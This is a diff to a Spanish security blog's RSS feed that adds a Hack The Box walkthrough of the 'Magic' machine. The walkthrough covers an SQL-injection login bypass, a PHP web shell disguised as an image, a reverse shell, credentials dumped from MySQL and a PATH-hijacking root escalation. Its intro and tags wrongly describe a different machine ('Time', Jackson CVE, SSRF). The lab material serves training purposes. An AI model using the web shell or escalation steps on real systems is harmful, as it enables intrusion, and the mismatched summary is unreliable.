@@ -5,9 +5,501 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 13 Jun 2023 18:54:56 +0000</pubDate>
-    <lastBuildDate>Tue, 13 Jun 2023 18:54:56 +0000</lastBuildDate>
+    <pubDate>Wed, 14 Jun 2023 00:09:33 +0000</pubDate>
+    <lastBuildDate>Wed, 14 Jun 2023 00:09:33 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Magic - htb writeup</title>
+        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Time&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de &lt;code&gt;Jackson CVE-2019-12384&lt;/code&gt;, y aprovecharemos la vulnerabilidad &lt;code&gt;SSRF&lt;/code&gt; derivandola en una ejecucion remota de comandos &lt;code&gt;RCE&lt;/code&gt; que nos dara acceso al sistema, para que finalmente aprovechandonos de una tarea &lt;code&gt;Cron&lt;/code&gt; podamos obtener acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Magic
+❯ ls
+ Magic
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.185
+PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
+64 bytes from 10.10.10.185: icmp_seq=1 ttl=63 time=137 ms
+
+--- 10.10.10.185 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 137.232/137.232/137.232/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.185 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 21:00 GMT
+Initiating SYN Stealth Scan at 21:00
+Scanning 10.10.10.185 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.185
+Discovered open port 22/tcp on 10.10.10.185
+Completed SYN Stealth Scan at 21:00, 16.68s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.185
+Host is up, received user-set (0.12s latency).
+Scanned at 2023-06-13 21:00:26 GMT for 17s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
+           Raw packets sent: 82274 (3.620MB) | Rcvd: 81681 (3.267MB)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto &lt;code&gt;22 ssh&lt;/code&gt; y el &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.185 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 21:01 GMT
+Nmap scan report for 10.10.10.185
+Host is up (0.20s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
+|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
+|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Magic Portfolio
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;SSH&lt;/td&gt;
+      &lt;td&gt;OpenSSH 7.6p1 Ubuntu 4ubuntu0.3&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Seguidamente vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ whatweb http://10.10.10.185
+http://10.10.10.185 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.185], JQuery, Script, Title[Magic Portfolio]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Vamos seguidamente a abrir la web en nuestro navegador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Observamos una que la pagina se compone de una serie de imagenes y tambien podemos ver que existe un enlace a un login que procederemos a visitar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para tratar de averiguar la ruta donde sube las imagenes, podemos usar el inspeccionador de elementos y mostrar la ruta de donde cargan las imagenes que corresponde a &lt;code&gt;/uploads&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Probamos a tratar de logearnos con credenciales por defecto pero nos resulta imposible. Como estamos frente a un panel de logeo, podemos tratar de ocasionar un error en los inputs mediante una &lt;code&gt;sql injection&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como resultado podemos logramos logearnos exitosamente y nos redirige a un panel donde podemos subir una imagen. Para ver si bien sanitizada la subida de archivos, probaremos con subir un archivo de nombre &lt;code&gt;cmd.php&lt;/code&gt; que mediante el uso de etiquetas preformateadas y haciendo uso de la función &lt;code&gt;shell_exec&lt;/code&gt; con el parametro &lt;code&gt;cmd&lt;/code&gt; ejecutar comandos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
+  echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Procedemos a subir el archivo pero vemos que solo admite formatos de imagen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos probar a renombrar nuestro archivo &lt;code&gt;cmd.php&lt;/code&gt; y asignarle una doble extensión para asi tratar de bypasear la subida.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que esta vez cambie el mensaje de error, y detecta que estamos tratando de manipular la subida.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Debemos de tener en cuenta que en base a los &lt;code&gt;magic numbers&lt;/code&gt; que son los primeros bytes de los archivos se validan los tipos de archivos en este caso si con el comando &lt;code&gt;file&lt;/code&gt; tratamos de validar nuestro archivo &lt;code&gt;cmd.php.png&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ file cmd.php.png
+cmd.php.png: PHP script, ASCII text
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos detecta que es un &lt;code&gt;php script&lt;/code&gt;, pero si agregamos la cabezera &lt;code&gt;GIF8;&lt;/code&gt; al inicio de nuestro archivo ahora nos lo detectara como &lt;code&gt;gif image&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;❯ file cmd.php.png
+cmd.php.png: GIF image data 16188 x 26736
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Probaremos a subir nuevamente el archivo modificado.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Obtenemos el mismo error, asi que esta vez vamos a descargar una imagen cualquier de &lt;code&gt;google&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a alterar su contenido añadiendo una intrucción en &lt;code&gt;php&lt;/code&gt; y añadiendo la extensión &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Subimos nuevamente el archivo y esta vez nos lo hace correctamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a la ruta donde se suben las imagenes que la obtuvimos previamente y efectivamente podemos ver nuestro archivo, aunque en un formato no legible por ser binario.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Validamos si podemos ejecutar comandos gracias a la instrucción php que añadimos y tenemos ejecución de comandos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora con bash vamos a enviarnos una reverse shell, para ello nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt; y obtenemos acceso como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.185.
+Ncat: Connection from 10.10.10.185:51270.
+bash: cannot set terminal process group (1136): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/Magic/images/uploads$ whoami
+whoami
+www-data
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora como de costumbre vamos a otorgarnos una &lt;code&gt;tty full interactiva&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic/images/uploads$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@ubuntu:/var/www/Magic/images/uploads$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+www-data@ubuntu:/var/www/Magic/images/uploads$ export TERM=xterm
+www-data@ubuntu:/var/www/Magic/images/uploads$ export SHELL=bash 
+www-data@ubuntu:/var/www/Magic/images/uploads$ stty rows 45 columns 184
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si volvemos al directorio &lt;code&gt;Magic&lt;/code&gt;, encontraremos un archivo &lt;code&gt;db.php5&lt;/code&gt; el cual contiene unas credenciales.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ ls
+assets	db.php5  images  index.php  login.php  logout.php  upload.php
+www-data@ubuntu:/var/www/Magic$ cat db.php5 
+&amp;lt;?php
+class Database
+{
+    private static $dbName = 'Magic' ;
+    private static $dbHost = 'localhost' ;
+    private static $dbUsername = 'theseus';
+    private static $dbUserPassword = 'iamkingtheseus';
+
+    private static $cont  = null;
+
+    public function __construct() {
+        die('Init function is not allowed');
+    }
+
+    public static function connect()
+    {
+        // One connection through whole application
+        if ( null == self::$cont )
+        {
+            try
+            {
+                self::$cont =  new PDO( &quot;mysql:host=&quot;.self::$dbHost.&quot;;&quot;.&quot;dbname=&quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword);
+            }
+            catch(PDOException $e)
+            {
+                die($e-&amp;gt;getMessage());
+            }
+        }
+        return self::$cont;
+    }
+
+    public static function disconnect()
+    {
+        self::$cont = null;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si tratamos de usar las credenciales para conectarnos como &lt;code&gt;theseus&lt;/code&gt;, vemos que no corresponde, pero podemos tratar de conectarnos a la base de datos. Y al no existir &lt;code&gt;mysql&lt;/code&gt;, podemos usar &lt;code&gt;mysqlshow&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ su theseus
+Password: 
+su: Authentication failure
+www-data@ubuntu:/var/www/Magic$ mysqlshow -utheseus -piamkingtheseus
+mysqlshow: [Warning] Using a password on the command line interface can be insecure.
++--------------------+
+|     Databases      |
++--------------------+
+| information_schema |
+| Magic              |
++--------------------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Podemos enumerar las bases de datos utilizadas, y ahora usaremos &lt;code&gt;mysqldump&lt;/code&gt; para dumpear las datos  almancenados en la base de datos &lt;code&gt;Magic&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;www-data@ubuntu:/var/www/Magic$ mysqldump -utheseus -piamkingtheseus Magic
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
+--
+-- Host: localhost    Database: Magic
+-- ------------------------------------------------------
+-- Server version	5.7.29-0ubuntu0.18.04.1
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8 */;
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
+/*!40103 SET TIME_ZONE='+00:00' */;
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+--
+-- Table structure for table `login`
+--
+
+DROP TABLE IF EXISTS `login`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `login` (
+  `id` int(6) NOT NULL AUTO_INCREMENT,
+  `username` varchar(50) NOT NULL,
+  `password` varchar(100) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `username` (`username`)
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `login`
+--
+
+LOCK TABLES `login` WRITE;
+/*!40000 ALTER TABLE `login` DISABLE KEYS */;
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+/*!40000 ALTER TABLE `login` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+
+/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
+/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
+/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
+
+-- Dump completed on 2023-06-13 15:00:33
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obtenemos unas credenciales correspondientes al usuario &lt;code&gt;theseus&lt;/code&gt;, ahora podemos migrar al usuario, dirigirnos al directorio del usuario y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ su theseus
+Password: 
+theseus@ubuntu:/var/www/Magic$ whoami
+theseus
+theseus@ubuntu:/var/www/Magic$ cd /home/theseus/
+theseus@ubuntu:~$ cat user.txt 
+fb197a83208d0d99ecdbed4ee83fc4f0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Listamos los archivos con privilegios &lt;code&gt;suid&lt;/code&gt;, vemos uno inusual &lt;code&gt;/bin/sysinfo&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:~$ find / -perm -4000 2&amp;gt;/dev/null | grep -v &quot;snap&quot;
+/usr/sbin/pppd
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/arping
+/usr/bin/vmware-user-suid-wrapper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/bin/umount
+/bin/fusermount
+/bin/sysinfo
+/bin/mount
+/bin/su
+/bin/ping
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si vemos los caracteres imprimibles del binario con la ayuda de &lt;code&gt;strings&lt;/code&gt;, podemos ver que hace uso del comando &lt;code&gt;fdisk&lt;/code&gt;, de manera relativa.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:~$ strings /bin/sysinfo
+/lib64/ld-linux-x86-64.so.2
+libstdc++.so.6
+__gmon_start__
+_ITM_deregisterTMCloneTable
+====================Hardware Info====================
+lshw -short
+====================Disk Info====================
+fdisk -l
+====================CPU Info====================
+cat /proc/cpuinfo
+====================MEM Usage=====================
+free -h
+;*3$&quot;
+zPLR
+GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
+crtstuff.c
+deregister_tm_clones
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo que haremos ahora sera efectuar un &lt;code&gt;path hijacking&lt;/code&gt;, donde alteraremos la ruta de nuestro &lt;code&gt;path&lt;/code&gt; y crearemos un archivo de nombre &lt;code&gt;fdisk&lt;/code&gt; donde le otorgaremos el privilegio &lt;code&gt;suid a la bash&lt;/code&gt;, de modo tal que al ejecutar &lt;code&gt;/bin/sysinfo&lt;/code&gt; hara uso del comando &lt;code&gt;fdisk&lt;/code&gt; y al haber manipulado nuestro &lt;code&gt;path&lt;/code&gt; lo hara desde la ruta actual que especifiquemos donde tendremos nuestro archivo creado, esto debido a que &lt;code&gt;fdisk&lt;/code&gt; no se esta aplicando de manera absoluta.&lt;/p&gt;
+
+&lt;p&gt;Te dejo el siguiente articulo para que veas mas a fondo esta vulnerabilidad.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://deephacking.tech/path-hijacking-y-library-hijacking/#path-hijacking&quot;&gt;https://deephacking.tech/path-hijacking-y-library-hijacking/#path-hijacking&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Procedemos a crearnos el archivo en la ruta &lt;code&gt;/tmp&lt;/code&gt;, que generalamente es donde se tiene permiso de escritura y le damos permiso de ejecución.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ cat fdisk 
+#!/bin/bash
+
+chmod u+s /bin/bash
+theseus@ubuntu:/tmp$ chmod +x fdisk
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora manilupalaremos nuestro &lt;code&gt;path&lt;/code&gt; para que este tire desde la ruta &lt;code&gt;/tmp&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+theseus@ubuntu:/tmp$ export PATH=/tmp:$PATH
+theseus@ubuntu:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ejecutamos el &lt;code&gt;/bin/sysinfo&lt;/code&gt; y vemos el privilegios de la &lt;code&gt;/bin/bash&lt;/code&gt; fue asignado correctamente.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ /bin/sysinfo
+====================Hardware Info====================
+H/W path           Device     Class      Description
+====================================================
+                              system     VMware Virtual Platform
+/0                            bus        440BX Desktop Reference Platform
+
+theseus@ubuntu:/tmp$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora solo debemos ejecutar el comando &lt;code&gt;bash -p&lt;/code&gt; y estariamos como el usuario &lt;code&gt;root&lt;/code&gt;, seguidamente podemos dirigirnos al directorio del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ bash -p
+bash-4.4# whoami
+root
+bash-4.4# cd /root
+bash-4.4# cat root.txt 
+a4f562d7949903aa1bf84994c94ce9e3
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Magic</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Magic</guid>
+        
+        <category>Jackson CVE-2019-12384 Exploitation</category>
+        
+        <category>SSRF to RCE</category>
+        
+        <category>Abusing Cron Job</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Compromised - htb writeup</title>
@@ -9289,44 +9781,6 @@ Voy a estudiar python
         
         
         <category>articulos</category>
-        
-      </item>
-    
-      <item>
-        <title>Windows 10 y 11 ya tienen parches para las capturas de pantalla</title>
-        <description>&lt;p&gt;Despues que unos investigadores de ciberseguridad habían descubierto un fallo en los móviles Google Pixel y los ordenadores con Windows. Según explicaban, el editor de capturas de pantalla de estos dispositivos mostraba las imágenes completas pese a que los usuarios la recortasen.&lt;/p&gt;
-
-&lt;p&gt;Segun se confirma se debian realizar ciertos pasos para confirmarlo.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://twitter.com/wdormann/status/1638235267919233024?ref_src=twsrc%5Etfw&quot;&gt;https://twitter.com/wdormann/status/1638235267919233024?ref_src=twsrc%5Etfw&lt;/a&gt;&lt;/li&gt;
